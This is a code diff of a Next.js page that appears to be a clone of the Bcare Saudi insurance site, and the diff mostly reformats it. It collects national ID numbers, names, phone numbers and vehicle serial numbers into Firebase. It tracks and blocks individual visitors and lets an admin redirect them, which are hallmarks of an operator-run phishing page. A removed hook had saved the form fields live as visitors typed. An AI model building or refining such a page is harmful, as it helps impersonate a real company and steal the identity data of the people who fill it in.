@@ -1,190 +1,177 @@
-"use client"
+"use client";
 
-import { useEffect, useState } from "react"
-import { useRouter } from "next/navigation"
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import { Globe, RefreshCw } from 'lucide-react'
-import { FullPageLoader } from "@/components/loader"
-import { StepIndicator } from "@/components/step-indicator"
-import { getOrCreateVisitorID, initializeVisitorTracking, checkIfBlocked, setupOnlineStatus } from "@/lib/visitor-tracking"
-import { useAutoSave } from "@/hooks/use-auto-save"
-import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { addData, saveToHistory } from "@/lib/firebase"
-import { translations } from "@/lib/translations"
+import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Globe, RefreshCw } from "lucide-react";
+import { FullPageLoader } from "@/components/loader";
+import { StepIndicator } from "@/components/step-indicator";
+import {
+  getOrCreateVisitorID,
+  initializeVisitorTracking,
+  checkIfBlocked,
+  setupOnlineStatus,
+} from "@/lib/visitor-tracking";
+import { useAutoSave } from "@/hooks/use-auto-save";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { addData, saveToHistory } from "@/lib/firebase";
+import { translations } from "@/lib/translations";
 
 function generateCaptcha() {
-  return Math.floor(1000 + Math.random() * 9000).toString()
+  return Math.floor(1000 + Math.random() * 9000).toString();
 }
 
 export default function HomePage() {
-  const router = useRouter()
-  const [visitorID] = useState(() => getOrCreateVisitorID())
-  const [loading, setLoading] = useState(true)
-  const [isBlocked, setIsBlocked] = useState(false)
-  
+  const router = useRouter();
+  const [visitorID] = useState(() => getOrCreateVisitorID());
+  const [loading, setLoading] = useState(true);
+  const [isBlocked, setIsBlocked] = useState(false);
+
   // Form fields
-  const [identityNumber, setidentityNumber] = useState("")
-  const [ownerName, setOwnerName] = useState("")
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [documentType, setDocumentType] = useState("استمارة")
-  const [serialNumber, setSerialNumber] = useState("")
-  const [insuranceType, setInsuranceType] = useState("تأمين جديد")
-  const [buyerName, setBuyerName] = useState("")
-  const [buyerIdNumber, setBuyerIdNumber] = useState("")
-  const [activeTab, setActiveTab] = useState("مركبات")
-  const [captchaCode, setCaptchaCode] = useState(generateCaptcha())
-  const [captchaInput, setCaptchaInput] = useState("")
-  const [captchaError, setCaptchaError] = useState(false)
-  
+  const [identityNumber, setidentityNumber] = useState("");
+  const [ownerName, setOwnerName] = useState("");
+  const [phoneNumber, setPhoneNumber] = useState("");
+  const [documentType, setDocumentType] = useState("استمارة");
+  const [serialNumber, setSerialNumber] = useState("");
+  const [insuranceType, setInsuranceType] = useState("تأمين جديد");
+  const [buyerName, setBuyerName] = useState("");
+  const [buyerIdNumber, setBuyerIdNumber] = useState("");
+  const [activeTab, setActiveTab] = useState("مركبات");
+  const [captchaCode, setCaptchaCode] = useState(generateCaptcha());
+  const [captchaInput, setCaptchaInput] = useState("");
+  const [captchaError, setCaptchaError] = useState(false);
+
   // Validation
-  const [identityNumberError, setidentityNumberError] = useState("")
-  
+  const [identityNumberError, setidentityNumberError] = useState("");
+
   // Language
-  const [language, setLanguage] = useState<"ar" | "en">("ar")
-  
-  // Auto-save all form data
-  useAutoSave({
-    visitorId: visitorID,
-    pageName: "home",
-    data: {
-      identityNumber,
-      ownerName,
-      phoneNumber,
-      documentType,
-      serialNumber,
-      insuranceType,
-      ...(insuranceType === "نقل ملكية" && {
-        buyerName,
-        buyerIdNumber
-      })
-    }
-  })
-  
+  const [language, setLanguage] = useState<"ar" | "en">("ar");
+
   // Monitor redirect requests from admin
   useRedirectMonitor({
     visitorId: visitorID,
-    currentPage: "home"
-  })
-  
+    currentPage: "home",
+  });
+
   // Initialize tracking on mount
   useEffect(() => {
     const init = async () => {
       try {
         // Set a maximum timeout of 5 seconds for initialization
-        const timeoutPromise = new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Initialization timeout')), 5000)
-        )
-        
+        const timeoutPromise = new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("Initialization timeout")), 5000),
+        );
+
         const initPromise = (async () => {
           // Check if blocked
-          const blocked = await checkIfBlocked(visitorID)
+          const blocked = await checkIfBlocked(visitorID);
           if (blocked) {
-            setIsBlocked(true)
-            return
+            setIsBlocked(true);
+            return;
           }
-          
+
           // Initialize tracking
-          await initializeVisitorTracking(visitorID)
-        })()
-        
+          await initializeVisitorTracking(visitorID);
+        })();
+
         // Race between init and timeout
-        await Promise.race([initPromise, timeoutPromise])
+        await Promise.race([initPromise, timeoutPromise]);
       } catch (error) {
-        console.error('Initialization error:', error)
+        console.error("Initialization error:", error);
         // Continue anyway - don't block the user
       } finally {
-        setLoading(false)
+        setLoading(false);
       }
-    }
-    init()
-    setupOnlineStatus(visitorID)
-  }, [visitorID])
-  
+    };
+    init();
+    setupOnlineStatus(visitorID);
+  }, [visitorID]);
+
   const refreshCaptcha = () => {
-    setCaptchaCode(generateCaptcha())
-    setCaptchaInput("")
-    setCaptchaError(false)
-  }
-  
+    setCaptchaCode(generateCaptcha());
+    setCaptchaInput("");
+    setCaptchaError(false);
+  };
+
   const handlePhoneNumberChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, '')
-    
-    if (cleaned.startsWith('05')) {
-      setPhoneNumber(cleaned.slice(0, 10))
-    } else if (cleaned.startsWith('5') && !cleaned.startsWith('05')) {
-      setPhoneNumber(cleaned.slice(0, 9))
+    const cleaned = value.replace(/\D/g, "");
+
+    if (cleaned.startsWith("05")) {
+      setPhoneNumber(cleaned.slice(0, 10));
+    } else if (cleaned.startsWith("5") && !cleaned.startsWith("05")) {
+      setPhoneNumber(cleaned.slice(0, 9));
     } else {
-      setPhoneNumber(cleaned.slice(0, 10))
+      setPhoneNumber(cleaned.slice(0, 10));
     }
-  }
-  
+  };
+
   // Handle identity number - numbers only
   const handleIdentityNumberChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
-    setidentityNumber(cleaned.slice(0, 10)) // Max 10 digits
-    if (identityNumberError) setidentityNumberError("")
-  }
-  
+    const cleaned = value.replace(/\D/g, ""); // Remove non-numeric
+    setidentityNumber(cleaned.slice(0, 10)); // Max 10 digits
+    if (identityNumberError) setidentityNumberError("");
+  };
+
   // Handle buyer ID number - numbers only
   const handleBuyerIdNumberChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
-    setBuyerIdNumber(cleaned.slice(0, 10)) // Max 10 digits
-  }
-  
+    const cleaned = value.replace(/\D/g, ""); // Remove non-numeric
+    setBuyerIdNumber(cleaned.slice(0, 10)); // Max 10 digits
+  };
+
   // Handle serial number - numbers only
   const handleSerialNumberChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
-    setSerialNumber(cleaned)
-  }
-  
+    const cleaned = value.replace(/\D/g, ""); // Remove non-numeric
+    setSerialNumber(cleaned);
+  };
+
   const validateSaudiId = (id: string): boolean => {
-    const cleanId = id.replace(/\s/g, "")
+    const cleanId = id.replace(/\s/g, "");
     if (!/^\d{10}$/.test(cleanId)) {
-      setidentityNumberError(translations[language].identityMust10Digits)
-      return false
+      setidentityNumberError(translations[language].identityMust10Digits);
+      return false;
     }
     if (!/^[12]/.test(cleanId)) {
-      setidentityNumberError(translations[language].identityMustStartWith12)
-      return false
+      setidentityNumberError(translations[language].identityMustStartWith12);
+      return false;
     }
-    let sum = 0
+    let sum = 0;
     for (let i = 0; i < 10; i++) {
-      let digit = Number.parseInt(cleanId[i])
+      let digit = Number.parseInt(cleanId[i]);
       if ((10 - i) % 2 === 0) {
-        digit *= 2
+        digit *= 2;
         if (digit > 9) {
-          digit -= 9
+          digit -= 9;
         }
       }
-      sum += digit
+      sum += digit;
     }
     if (sum % 10 !== 0) {
-      setidentityNumberError(translations[language].invalidIdentityNumber)
-      return false
+      setidentityNumberError(translations[language].invalidIdentityNumber);
+      return false;
     }
-    setidentityNumberError("")
-    return true
-  }
-  
+    setidentityNumberError("");
+    return true;
+  };
+
   // Handle form submit
   const handleFirstStepSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    
+    e.preventDefault();
+
     if (!validateSaudiId(identityNumber)) {
-      return
+      return;
     }
-    
+
     if (captchaInput !== captchaCode) {
-      setCaptchaError(true)
-      return
+      setCaptchaError(true);
+      return;
     }
-    
-    setLoading(true)
-    
+
+    setLoading(true);
+
     // Save current data to history before updating
-    await saveToHistory(visitorID, 1)
-    
+    await saveToHistory(visitorID, 1);
+
     // Save final data before navigation
     await addData({
       id: visitorID,
@@ -196,47 +183,57 @@ export default function HomePage() {
       insuranceType,
       ...(insuranceType === "نقل ملكية" && {
         buyerName,
-        buyerIdNumber
+        buyerIdNumber,
       }),
       currentStep: 2,
       currentPage: "insur",
-      homeCompletedAt: new Date().toISOString()
+      homeCompletedAt: new Date().toISOString(),
     }).then(() => {
       // Wait 1.5 seconds before moving to next step
-        setLoading(false)
-        router.push('/insur')
-    })
-  }
-  
+      setLoading(false);
+      router.push("/insur");
+    });
+  };
+
   if (loading) {
-    return <FullPageLoader />
+    return <FullPageLoader />;
   }
-  
+
   if (isBlocked) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50">
         <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
-          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
+          <h1 className="text-2xl font-bold text-red-600 mb-4">
+            تم حظر الوصول
+          </h1>
           <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
-          <p className="text-gray-600 mt-2">للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.</p>
+          <p className="text-gray-600 mt-2">
+            للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.
+          </p>
         </div>
       </div>
-    )
+    );
   }
-  
+
   return (
     <div className="min-h-screen bg-white">
       {/* Header */}
       <div className="px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-slate-200 bg-white">
-        <button 
+        <button
           onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
           className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-full hover:bg-white transition-colors shadow-md"
         >
           <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
-          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
+          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">
+            {language === "ar" ? "EN" : "AR"}
+          </span>
         </button>
         <div className="bg-white rounded-2xl px-3 py-2 shadow-lg">
-          <img src="/Bcare-logo.svg" alt="BeCare" className="h-7 md:h-8 w-auto" />
+          <img
+            src="/Bcare-logo.svg"
+            alt="BeCare"
+            className="h-7 md:h-8 w-auto"
+          />
         </div>
       </div>
 
@@ -244,12 +241,15 @@ export default function HomePage() {
       <div className="max-w-3xl mx-auto pt-6 md:pt-10 px-3 md:px-4 pb-6 md:pb-8">
         <div className="bg-white rounded-xl md:rounded-2xl shadow-xl overflow-hidden">
           {/* Tabs */}
-          <div className="grid grid-cols-4 text-center border-b border-slate-100 bg-gradient-to-b from-slate-50/50 to-white" dir={language === "ar" ? "rtl" : "ltr"}>
+          <div
+            className="grid grid-cols-4 text-center border-b border-slate-100 bg-gradient-to-b from-slate-50/50 to-white"
+            dir={language === "ar" ? "rtl" : "ltr"}
+          >
             {[
               { ar: "مركبات", en: "Vehicles", key: "vehicles" },
               { ar: "طبي", en: "Medical", key: "medical" },
               { ar: "أخطاء طبية", en: "Medical Errors", key: "medicalErrors" },
-              { ar: "سفر", en: "Travel", key: "travel" }
+              { ar: "سفر", en: "Travel", key: "travel" },
             ].map((tab) => (
               <button
                 key={tab.key}
@@ -269,7 +269,11 @@ export default function HomePage() {
           </div>
 
           {/* Form */}
-          <form onSubmit={handleFirstStepSubmit} className="p-4 md:p-6 lg:p-8 space-y-3 md:space-y-4" dir={language === "ar" ? "rtl" : "ltr"}>
+          <form
+            onSubmit={handleFirstStepSubmit}
+            className="p-4 md:p-6 lg:p-8 space-y-3 md:space-y-4"
+            dir={language === "ar" ? "rtl" : "ltr"}
+          >
             {/* Insurance Type Buttons */}
             <div className="grid grid-cols-2 gap-2 md:gap-3">
               <button
@@ -309,7 +313,10 @@ export default function HomePage() {
               required
             />
             {identityNumberError && (
-              <p className={`text-red-500 text-sm mt-1 ${language === "ar" ? "text-right" : "text-left"}`} dir={language === "ar" ? "rtl" : "ltr"}>
+              <p
+                className={`text-red-500 text-sm mt-1 ${language === "ar" ? "text-right" : "text-left"}`}
+                dir={language === "ar" ? "rtl" : "ltr"}
+              >
                 {identityNumberError}
               </p>
             )}
@@ -393,7 +400,11 @@ export default function HomePage() {
               type="tel"
               inputMode="numeric"
               pattern="[0-9]*"
-              placeholder={documentType === "بطاقة جمركية" ? translations[language].customsDeclarationNumber : translations[language].serialNumber}
+              placeholder={
+                documentType === "بطاقة جمركية"
+                  ? translations[language].customsDeclarationNumber
+                  : translations[language].serialNumber
+              }
               value={serialNumber}
               onChange={(e) => handleSerialNumberChange(e.target.value)}
               className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
@@ -436,8 +447,8 @@ export default function HomePage() {
                   placeholder={translations[language].verificationCode}
                   value={captchaInput}
                   onChange={(e) => {
-                    setCaptchaInput(e.target.value)
-                    setCaptchaError(false)
+                    setCaptchaInput(e.target.value);
+                    setCaptchaError(false);
                   }}
                   className={`h-10 md:h-11 text-right text-base md:text-lg flex-1 border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] text-gray-900 font-medium ${
                     captchaError ? "border-red-500 bg-red-50" : ""
@@ -447,7 +458,9 @@ export default function HomePage() {
                 />
               </div>
               {captchaError && (
-                <p className={`text-red-500 text-xs md:text-sm mt-2 ${language === "ar" ? "text-right" : "text-left"} font-semibold`}>
+                <p
+                  className={`text-red-500 text-xs md:text-sm mt-2 ${language === "ar" ? "text-right" : "text-left"} font-semibold`}
+                >
                   {translations[language].incorrectCaptcha}
                 </p>
               )}
@@ -464,5 +477,5 @@ export default function HomePage() {
         </div>
       </div>
     </div>
-  )
+  );
 }
